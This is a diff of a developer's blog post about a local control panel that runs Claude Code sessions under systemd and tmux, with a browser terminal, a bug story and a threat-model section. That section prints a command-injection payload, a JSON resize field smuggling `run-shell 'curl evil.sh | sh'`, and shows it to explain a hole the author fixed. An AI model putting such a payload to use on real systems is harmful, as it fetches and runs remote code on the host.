@@ -1,6 +1,6 @@
 ---
 title: "Agent Manager — coordinating many Claude Code sessions on one repo"
-description: "A local control panel that runs Claude Code remote-control sessions as systemd --user services, then lets several of them work the same repo in parallel — coordinated by written protocols the agents follow, not port math baked into the tool."
+description: "A local control panel that runs Claude Code sessions as systemd --user services, gives each one a real browser terminal over tmux control mode, and lets several of them work the same repo in parallel — coordinated by written protocols the agents follow, not port math baked into the tool."
 date: 2026-07-10
 ---
 
@@ -8,17 +8,17 @@ I wanted to run **Claude Code remote-control (RC)** sessions — one per repo,
 always on, reachable from my phone — without handing any of it to a cloud
 service. So I built [**Agent Manager**](https://github.com/getsec/claude-rc-manager):
 a local, single-user web control panel that runs each session as a
-`systemd --user` service, gives you a dashboard over `systemctl --user` and
-`journalctl`, and — the part this post is about — lets *several* sessions work
-the **same repo** in parallel without stepping on each other.
+`systemd --user` service, gives you a dashboard over `systemctl --user`, drops a
+real terminal into any session from the browser, and — the part most of this post
+is about — lets *several* sessions work the **same repo** in parallel without
+stepping on each other.
 
 It runs entirely on your own machine, as your own user. No root, no cloud, no
 auth.
 
 One caveat up front: there are probably many ways to do this, and I don't think
 this is the *best* way. But I always find it fun to build your own — and rolling
-it from scratch is a genuinely good way to learn how the pieces actually fit
-together. Take this as one person's fun way to learn, not a recommendation to
+it from scratch is a good way to learn how the pieces actually fit together. Take this as one person's fun way to learn, not a recommendation to
 replace whatever already works for you.
 
 <figure>
@@ -30,23 +30,28 @@ replace whatever already works for you.
 
 Before the multi-agent part makes sense, the single-session model:
 
-`claude --remote-control` is an *interactive* command. It expects a real TTY.
-Run it headless under a plain `Type=simple` systemd service and it detects
-there's no terminal, falls into `--print` mode, does one shot, and exits — the
-opposite of an always-on session.
+`claude` is an *interactive* command. It expects a real TTY. Run it headless
+under a plain `Type=simple` systemd service and it detects there's no terminal,
+falls into `--print` mode, does one shot, and exits — the opposite of an
+always-on session.
 
 So each session runs as an instance of a `systemd --user` template unit,
 `claude-rc@<name>.service`, and the unit launches Claude **inside its own private
 tmux server**:
 
 ```ini
+Environment="AM_RC_ARGS=--remote-control --remote-control-session-name-prefix %i"
 ExecStart=/usr/bin/tmux -L rc-%i new-session -d -s claude-rc-%i \
-  '%h/.local/bin/claude --remote-control --remote-control-session-name-prefix %i'
+  %h/.local/bin/claude $AM_RC_ARGS
 ```
 
 That `-L rc-%i` is the whole trick. The private tmux server supplies the PTY
 Claude insists on, and — because it's a per-service socket rather than the shared
 default — it keeps each session in its **own cgroup**.
+
+(`$AM_RC_ARGS` is a later addition — remote control became a per-session choice
+rather than a hardcoded flag. More on that below, including the quoting bug that
+cost me an hour.)
 
 > Stopping one session never touches another. That isolation is what makes
 > running *many* agents on one box safe to reason about — and it's the
@@ -59,10 +64,160 @@ systemctl --user stop claude-rc@<a>
 # session <b> must stay online in the phone app
 ```
 
-<figure>
-  <img src="/blog/agent-manager/log-drawer.png" alt="Live journal drawer for a session streaming systemd and tmux log lines" />
-  <figcaption>The <code>logs</code> drawer is just a live <code>journalctl -f</code> on that session's unit — systemd and its private tmux server, streamed straight to the browser.</figcaption>
-</figure>
+That private tmux server turned out to be worth more than the PTY shim I built it
+for. Every session already lives in one — so anything that can talk to tmux can
+talk to the agent.
+
+## Watching became driving: a real terminal in the browser
+
+The dashboard originally had a read-only `logs` drawer. It was useful for about a
+week, and then the limitation became obvious: Claude regularly *stops and asks
+you something*. A permission prompt, a menu, `shift+tab` to cycle a mode. None of
+those are answerable with text — they need real keys. Watching an agent sit
+blocked on a dialog you can't answer is a special kind of useless.
+
+So the drawer is gone, replaced by an actual terminal attached to the session's
+pane. Type a prompt, hit Enter, press **Escape** to interrupt a runaway agent,
+arrow through a dialog.
+
+The obvious way to build this is `node-pty`: allocate a PTY, `tmux attach`, pipe
+it to xterm.js. I didn't, for a boring reason that I think is the right one — the
+project has zero native dependencies and a README that promises a plain
+`npm install`. Dragging in a compiler toolchain to answer a yes/no prompt is a
+bad trade.
+
+**tmux control mode** (`tmux -C attach`) gets there with no PTY at all. It's a
+line protocol on stdin/stdout: pane output arrives as `%output` notifications,
+and you send commands back as plain lines. It's what iTerm2's tmux integration
+uses, so it's well-trodden. The whole backend is a child process on pipes:
+
+```
+xterm.js  ──binary frame (keystrokes)──▶  WS  ──▶  send-keys -H <hex>  ──▶  tmux pane
+xterm.js  ◀──binary frame (pane bytes)──  WS  ◀──  %output notification ◀──  tmux pane
+```
+
+Input goes in as `send-keys -H` — hex bytes — which sidesteps every quoting
+question about what a keystroke might contain. Hold onto that; it's the reason
+the one security hole I shipped was in the *other* direction.
+
+### The bug that only a real terminal could find
+
+Every test passed. Two separate smoke checks against a live session passed. Then
+I opened the drawer against the real server and got a blank terminal painting
+exactly 30 bytes.
+
+`tmux -C attach` emits one `%begin`/`%end` block **for the attach itself**, which
+you never asked for. My client correlated command replies to a FIFO of pending
+resolvers, so that phantom block stole the first resolver, and every reply landed
+one slot early: the screen capture resolved into the empty reply meant for the
+resize before it. Blank screen.
+
+It's a race, which is exactly why everything else passed — when the phantom
+happened to arrive *before* the first command was sent, it was dropped harmlessly
+and the terminal worked fine. Chasing it turned up a sibling bug in the same
+mechanism: tmux answers *every* command with a block, but `write` and `resize`
+were fire-and-forget and pushed no resolver — so typing while the screen was
+still painting would corrupt the paint.
+
+> One invariant fixed both: **every line written to tmux's stdin enqueues exactly
+> one resolver, and nothing is sent until the phantom attach block is consumed.**
+
+The lesson I keep re-learning: unit tests confirm the model in your head. Only
+driving the real thing tells you whether that model is right.
+
+### A terminal changes the threat model
+
+Two things fell out that I hadn't thought hard enough about.
+
+WebSockets ignore CORS. The app has no auth — it's loopback-by-default and that's
+always been the deal. But the HTTP API is *not* reachable cross-origin: a JSON
+POST from some random page gets preflighted away. A WebSocket handshake isn't.
+Any site you visit could have opened `ws://127.0.0.1:8787/...` and started typing
+into your agents. The fix is the only boundary available without auth — reject the
+upgrade unless `Origin`'s host matches the request's own `Host`, exact parsed
+comparison (a `startsWith` here is defeated by `http://127.0.0.1:8787.evil.com`).
+A *missing* Origin is fine: browsers always send one, so it only ever means a
+non-browser client.
+
+The second one was worse. Keystrokes were hex-encoded and safe, but the resize
+path interpolated client JSON straight into a control-mode command line — and
+control mode is line-oriented. A JSON string may legally contain a newline:
+
+```json
+{"type":"resize","cols":"1\nrun-shell 'curl evil.sh | sh'","rows":1}
+```
+
+`run-shell` executes on the host. Dimensions are now rejected — not clamped —
+unless they're positive integers within bounds, validated on both sides of the
+boundary.
+
+I'd written in my own design doc that a terminal "is not an escalation" of what
+the dashboard could already do, since it can already provision repos and start
+agents that run arbitrary commands. That was wrong in one specific way, and the
+injection bug is what made me look hard enough to notice.
+
+### The phone, again
+
+The terminal is fullscreen, which came down to two CSS decisions that determine
+whether it's usable on a phone at all.
+
+The height has to be `100dvh`, not `100vh`. On mobile Safari and Chrome, `100vh`
+means "the viewport with the address bar hidden", so a `100vh` terminal runs
+taller than the screen and the rows it shoves off the bottom are exactly the ones
+you need — Claude's input box. `dvh` tracks the viewport you can actually see.
+
+And Escape can't close it. Every overlay wants to close on Escape; this one
+can't, because Escape is the most valuable key the terminal forwards — it's how
+you interrupt an agent mid-response. An Escape-to-close overlay would eat the
+keystroke you most need. So it closes with a button and nothing clever: no swipe,
+which fights the terminal's own touch scrolling, and no chord, because any chord
+I claim is a chord Claude can never receive.
+
+The on-screen keyboard should need no special handling: it shrinks the visual
+viewport, the container resizes, and the same `ResizeObserver` that handles a
+window resize refits and tells tmux the new size. *Should*, because that's the
+one part I haven't confirmed on a real device yet — xterm focuses a hidden
+textarea to raise the keyboard, and iOS is notoriously picky about programmatic
+focus. If it doesn't fire, the fix is a tap handler that focuses from the real
+gesture. I'd rather say that than claim a phone test I haven't run.
+
+## Remote control became a choice
+
+Once the terminal existed, `--remote-control` stopped being load-bearing for
+*local* control — a terminal into the pane doesn't care what's running in it.
+Plain `claude` in tmux gives an identical terminal.
+
+What RC still buys is the thing the terminal fundamentally can't: the
+`claude.ai/code` session URL, which reaches a session **from outside your
+network**, on your phone, without exposing your box to the internet. That's worth
+having sometimes and pointless other times. So it's a per-session checkbox now.
+
+The mechanism is a systemd drop-in per instance, overriding that `AM_RC_ARGS`
+variable from the unit template:
+
+```ini
+[Service]
+Environment="AM_RC_ARGS=--remote-control --remote-control-session-name-prefix %i"
+```
+
+The drop-in file **is** the state. There's no mirrored field in the manager's
+JSON — systemd already stores the config systemd reads, and a second copy is just
+something to disagree with.
+
+> Those quotes are load-bearing. Unquoted, systemd splits `Environment=` on
+> whitespace and parses the rest as further assignments, so the value silently
+> truncates to `--remote-control` and the session-name prefix vanishes. It logs
+> `Invalid environment assignment` to journald and otherwise behaves fine. I
+> shipped that bug into my own design doc, wrote a global constraint warning
+> about it, and then violated it one section later.
+
+The default stays RC-on for instances with **no** drop-in, which is deliberate:
+every session that predates the feature has no drop-in, and flipping the default
+would have silently stripped remote control from sessions already running.
+
+One honest edge: `ExecStart` is only read at start, so toggling RC requires a
+restart, and a restart costs the agent its in-memory context. The confirm dialog
+says exactly that rather than a generic "Are you sure?".
 
 ## The real problem: two agents, one repo, one set of ports
 
@@ -184,14 +339,27 @@ implemented**. Today the agent reads its block from `SESSIONS.md` and wires its
 own `.env`; the manager doesn't inject anything into the process. That's a
 conscious "later," not a thing I'm pretending works.
 
-And the honest limitation that predates all of this: the dashboard shows
-**systemd health** — active, failed, restart count — not Claude's own "green dot"
-connection state, which lives on Claude's servers, not your box. A unit can be
-`active` while the app-layer link is degraded. For authoritative online status,
-the phone app's Code tab is the source of truth. I'd rather the dashboard report
+And the honest limitation that predates all of this: the dashboard's status pills
+show **systemd health** — active, failed, restart count — not Claude's own "green
+dot" connection state, which lives on Claude's servers, not your box. A unit can
+be `active` while the app-layer link is degraded. I'd rather the dashboard report
 exactly what it knows than fake a signal it doesn't have.
 
+The terminal softens this without actually fixing it: you can now open the pane
+and *read* what Claude says about itself — including the `/remote-control is
+active` banner and its session URL. That's the agent's own account of its state,
+which is a lot better than inferring from a cgroup, but it's still not a
+connection check. For authoritative online status the phone app's Code tab
+remains the source of truth.
+
 ## Takeaway
+
+In hindsight the decisions I still like were all refusals to own something. Ports
+belong to a document the agents read. Whether a session wants remote control
+belongs to a systemd drop-in. A terminal already existed inside tmux; control
+mode just asks it nicely. Each of those started as "should the tool be smart
+about this?", and each time the better answer was to find whatever already owned
+the problem and leave it there.
 
 The interesting design call wasn't the systemd plumbing — it was refusing to make
 the manager the coordinator. Ports, containers, and compose stacks are exactly
